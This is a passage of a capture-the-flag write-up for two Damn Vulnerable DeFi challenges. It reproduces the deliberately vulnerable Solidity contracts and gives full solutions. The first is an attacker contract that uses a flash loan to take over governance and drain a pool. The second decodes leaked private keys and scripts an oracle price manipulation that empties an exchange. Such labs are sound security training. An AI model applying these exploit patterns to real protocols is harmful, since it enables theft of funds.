            revert CallbackFailed();

        if (!token.transferFrom(address(_receiver), address(this), _amount))
            revert RepayFailed();
        
        return true;
    }

    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
}
```

_SimpleGovernance.sol_

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./ISimpleGovernance.sol"
;
/**
 * @title SimpleGovernance
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SimpleGovernance is ISimpleGovernance {

    uint256 private constant ACTION_DELAY_IN_SECONDS = 2 days;
    DamnValuableTokenSnapshot private _governanceToken;
    uint256 private _actionCounter;
    mapping(uint256 => GovernanceAction) private _actions;

    constructor(address governanceToken) {
        _governanceToken = DamnValuableTokenSnapshot(governanceToken);
        _actionCounter = 1;
    }

    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender))
            revert NotEnoughVotes(msg.sender);

        if (target == address(this))
            revert InvalidTarget();
        
        if (data.length > 0 && target.code.length == 0)
            revert TargetMustHaveCode();

        actionId = _actionCounter;

        _actions[actionId] = GovernanceAction({
            target: target,
            value: value,
            proposedAt: uint64(block.timestamp),
            executedAt: 0,
            data: data
        });

        unchecked { _actionCounter++; }

        emit ActionQueued(actionId, msg.sender);
    }

    function executeAction(uint256 actionId) external payable returns (bytes memory) {
        if(!_canBeExecuted(actionId))
            revert CannotExecute(actionId);

        GovernanceAction storage actionToExecute = _actions[actionId];
        actionToExecute.executedAt = uint64(block.timestamp);

        emit ActionExecuted(actionId, msg.sender);

        (bool success, bytes memory returndata) = actionToExecute.target.call{value: actionToExecute.value}(actionToExecute.data);
        if (!success) {
            if (returndata.length > 0) {
                assembly {
                    revert(add(0x20, returndata), mload(returndata))
                }
            } else {
                revert ActionFailed(actionId);
            }
        }

        return returndata;
    }

    function getActionDelay() external pure returns (uint256) {
        return ACTION_DELAY_IN_SECONDS;
    }

    function getGovernanceToken() external view returns (address) {
        return address(_governanceToken);
    }

    function getAction(uint256 actionId) external view returns (GovernanceAction memory) {
        return _actions[actionId];
    }

    function getActionCounter() external view returns (uint256) {
        return _actionCounter;
    }

    /**
     * @dev an action can only be executed if:
     * 1) it's never been executed before and
     * 2) enough time has passed since it was first proposed
     */
    function _canBeExecuted(uint256 actionId) private view returns (bool) {
        GovernanceAction memory actionToExecute = _actions[actionId];
        
        if (actionToExecute.proposedAt == 0) // early exit
            return false;

        uint64 timeDelta;
        unchecked {
            timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt;
        }

        return actionToExecute.executedAt == 0 && timeDelta >= ACTION_DELAY_IN_SECONDS;
    }

    function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);
        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;
        return balance > halfTotalSupply;
    }
}
```

## Solution

Before we look at the solution, let's first understand the two smart contracts involved in this challenge.
`SelfiePool` is a flash loan provider including an `emergencyExit()` function that allows its governance contract to drain funds in emergencies.
`SimpleGovernance` is `SelfiePool`'s governance contract. 
It allows users to propose actions for execution if the proposal is supported by a sufficiently high number of governance token votes (at least 50% of the total supply).
Additionally, proposals can only be executed after they have spent at least 2 days in the queue.

The first thing we notice is that the execution of actions includes the ability to make function calls.
In other words, if we can find a way to successfully propose an action, we can have that action call the `emergencyExit()` function to drain the contract.

The challenge we need to overcome is that we need at least 50% of the DVT token supply to queue such an action.
To achieve this, we can simply request a sufficiently high DVT flash loan from `SelfiePool`, queue the action, and pay back the loan using the following attacker contract:

_SelfiePoolAttacker.sol_

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);
}

interface IGovernance {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
}

interface IERC20Snapshot is IERC20 {
    function snapshot() external returns (uint256 lastSnapshotId);
}

contract SelfiePoolAttacker {

    address immutable player;
    IPool immutable pool;
    IGovernance immutable governance;
    IERC20Snapshot immutable token;
    uint256 constant AMOUNT = 1_500_000 * 1e18;

    constructor(address _pool, address _governance, address _token){
        player = msg.sender;
        pool = IPool(_pool);
        governance = IGovernance(_governance);
        token = IERC20Snapshot(_token);
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
        
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)), address(token), AMOUNT, data
        );
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata data) external returns(bytes32) {
        token.snapshot();

        governance.queueAction(address(pool), 0, data);

        token.approve(address(pool), AMOUNT);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

}
```

After successfully registering our action proposal, the only thing left to do is to wait for (i.e., fast-forward) two days and execute our action.

_selfie.challenge.js_

```javascript
...
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    let attacker = await (await ethers.getContractFactory("SelfiePoolAttacker", player)).deploy(
        pool.address, governance.address, token.address
    )

    await attacker.attack();
    const ACTION_DELAY_IN_SECONDS = 2 * 24 * 60 * 60;
    await time.increase(ACTION_DELAY_IN_SECONDS);

    await governance.connect(player).executeAction(1);
});
...
```

# 7. Compromised

## Contracts

_Exchange.sol_

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "./TrustfulOracle.sol";
import "../DamnValuableNFT.sol";

/**
 * @title Exchange
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Exchange is ReentrancyGuard {
    using Address for address payable;

    DamnValuableNFT public immutable token;
    TrustfulOracle public immutable oracle;

    error InvalidPayment();
    error SellerNotOwner(uint256 id);
    error TransferNotApproved();
    error NotEnoughFunds();

    event TokenBought(address indexed buyer, uint256 tokenId, uint256 price);
    event TokenSold(address indexed seller, uint256 tokenId, uint256 price);

    constructor(address _oracle) payable {
        token = new DamnValuableNFT();
        token.renounceOwnership();
        oracle = TrustfulOracle(_oracle);
    }

    function buyOne() external payable nonReentrant returns (uint256 id) {
        if (msg.value == 0)
            revert InvalidPayment();

        // Price should be in [wei / NFT]
        uint256 price = oracle.getMedianPrice(token.symbol());
        if (msg.value < price)
            revert InvalidPayment();

        id = token.safeMint(msg.sender);
        unchecked {
            payable(msg.sender).sendValue(msg.value - price);
        }

        emit TokenBought(msg.sender, id, price);
    }

    function sellOne(uint256 id) external nonReentrant {
        if (msg.sender != token.ownerOf(id))
            revert SellerNotOwner(id);
    
        if (token.getApproved(id) != address(this))
            revert TransferNotApproved();

        // Price should be in [wei / NFT]
        uint256 price = oracle.getMedianPrice(token.symbol());
        if (address(this).balance < price)
            revert NotEnoughFunds();

        token.transferFrom(msg.sender, address(this), id);
        token.burn(id);

        payable(msg.sender).sendValue(price);

        emit TokenSold(msg.sender, id, price);
    }

    receive() external payable {}
}
```

_TrustfulOracle.sol_

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControlEnumerable.sol";
import "solady/src/utils/LibSort.sol";

/**
 * @title TrustfulOracle
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @notice A price oracle with a number of trusted sources that individually report prices for symbols.
 *         The oracle's price for a given symbol is the median price of the symbol over all sources.
 */
contract TrustfulOracle is AccessControlEnumerable {
    uint256 public constant MIN_SOURCES = 1;
    bytes32 public constant TRUSTED_SOURCE_ROLE = keccak256("TRUSTED_SOURCE_ROLE");
    bytes32 public constant INITIALIZER_ROLE = keccak256("INITIALIZER_ROLE");

    // Source address => (symbol => price)
    mapping(address => mapping(string => uint256)) private _pricesBySource;

    error NotEnoughSources();

    event UpdatedPrice(address indexed source, string indexed symbol, uint256 oldPrice, uint256 newPrice);

    constructor(address[] memory sources, bool enableInitialization) {
        if (sources.length < MIN_SOURCES)
            revert NotEnoughSources();
        for (uint256 i = 0; i < sources.length;) {
            unchecked {
                _setupRole(TRUSTED_SOURCE_ROLE, sources[i]);
                ++i;
            }
        }
        if (enableInitialization)
            _setupRole(INITIALIZER_ROLE, msg.sender);
    }

    // A handy utility allowing the deployer to setup initial prices (only once)
    function setupInitialPrices(address[] calldata sources, string[] calldata symbols, uint256[] calldata prices)
        external
        onlyRole(INITIALIZER_ROLE)
    {
        // Only allow one (symbol, price) per source
        require(sources.length == symbols.length && symbols.length == prices.length);
        for (uint256 i = 0; i < sources.length;) {
            unchecked {
                _setPrice(sources[i], symbols[i], prices[i]);
                ++i;
            }
        }
        renounceRole(INITIALIZER_ROLE, msg.sender);
    }

    function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
        _setPrice(msg.sender, symbol, newPrice);
    }

    function getMedianPrice(string calldata symbol) external view returns (uint256) {
        return _computeMedianPrice(symbol);
    }

    function getAllPricesForSymbol(string memory symbol) public view returns (uint256[] memory prices) {
        uint256 numberOfSources = getRoleMemberCount(TRUSTED_SOURCE_ROLE);
        prices = new uint256[](numberOfSources);
        for (uint256 i = 0; i < numberOfSources;) {
            address source = getRoleMember(TRUSTED_SOURCE_ROLE, i);
            prices[i] = getPriceBySource(symbol, source);
            unchecked { ++i; }
        }
    }

    function getPriceBySource(string memory symbol, address source) public view returns (uint256) {
        return _pricesBySource[source][symbol];
    }

    function _setPrice(address source, string memory symbol, uint256 newPrice) private {
        uint256 oldPrice = _pricesBySource[source][symbol];
        _pricesBySource[source][symbol] = newPrice;
        emit UpdatedPrice(source, symbol, oldPrice, newPrice);
    }

    function _computeMedianPrice(string memory symbol) private view returns (uint256) {
        uint256[] memory prices = getAllPricesForSymbol(symbol);
        LibSort.insertionSort(prices);
        if (prices.length % 2 == 0) {
            uint256 leftPrice = prices[(prices.length / 2) - 1];
            uint256 rightPrice = prices[prices.length / 2];
            return (leftPrice + rightPrice) / 2;
        } else {
            return prices[prices.length / 2];
        }
    }
}
```

_TrustfulOracleInitializer.sol_

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { TrustfulOracle } from "./TrustfulOracle.sol";

/**
 * @title TrustfulOracleInitializer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrustfulOracleInitializer {
    event NewTrustfulOracle(address oracleAddress);

    TrustfulOracle public oracle;

    constructor(address[] memory sources, string[] memory symbols, uint256[] memory initialPrices) {
        oracle = new TrustfulOracle(sources, true);
        oracle.setupInitialPrices(sources, symbols, initialPrices);
        emit NewTrustfulOracle(address(oracle));
    }
}
```

## Solution

The first thing we notice is that the "strange response" from the server looks like the hex representation of two ASCII strings.
So, the our first attempt in making sense of the server's response is to put

```
4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
```

into a [hex-to-text converter](https://www.rapidtables.com/convert/number/hex-to-ascii.html).
The resulting string reads:

```
MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
```

Similarly, can convert the second part of the response from 

```
4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

to:

```
MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
```

Both of these strings look like Base64-encoded data, so let's take a look at their respective decoding:

```bash
echo MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5 | base64 --decode
# Result: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9

echo MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4 | base64 --decode
# Result: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
```

We see that both outputs consist of 64 hex characters each (excluding `0x`).
That's exactly the length of Ethereum private keys!

Thus, it's not too far-fetched to assume that these two outputs are the private keys of two of the three "trusted reporters".

We will see that that's indeed the case.
Therefore, we can pull off the following attack to complete the challenge:

1. Use the two compromised reporters to set a very low NFT price, e.g., 1 Wei.
2. Purchase an NFT from the exchange.
3. Use the two compromised reporters to set the NFT price to the entire balance of the exchange.
4. Sell the NFT back to the exchange to drain the funds from the exchange.
5. Use the two compromised reporters to restore the original price.

_compromised.challenge.js_

```javascript
...
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    const privateKey1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
    const privateKey2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
    const signer1 = new ethers.Wallet(privateKey1, ethers.provider);
    const signer2 = new ethers.Wallet(privateKey2, ethers.provider);

    // Set price to 1 Wei
    await oracle.connect(signer1).postPrice("DVNFT", 1);
    await oracle.connect(signer2).postPrice("DVNFT", 1);

    // Buy an NFT
    await exchange.connect(player).buyOne({value: 1});

    // Set price to 999 Ether + 1 Wei
    await oracle.connect(signer1).postPrice("DVNFT", INITIAL_NFT_PRICE + BigInt(1));
    await oracle.connect(signer2).postPrice("DVNFT", INITIAL_NFT_PRICE + BigInt(1));
    
    // Sell the NFT back to the exchange
    await nftToken.connect(player).approve(exchange.address, 0);
    await exchange.connect(player).sellOne(0);

    // Restore original price
    await oracle.connect(signer1).postPrice("DVNFT", INITIAL_NFT_PRICE);
    await oracle.connect(signer2).postPrice("DVNFT", INITIAL_NFT_PRICE);
});
...
```
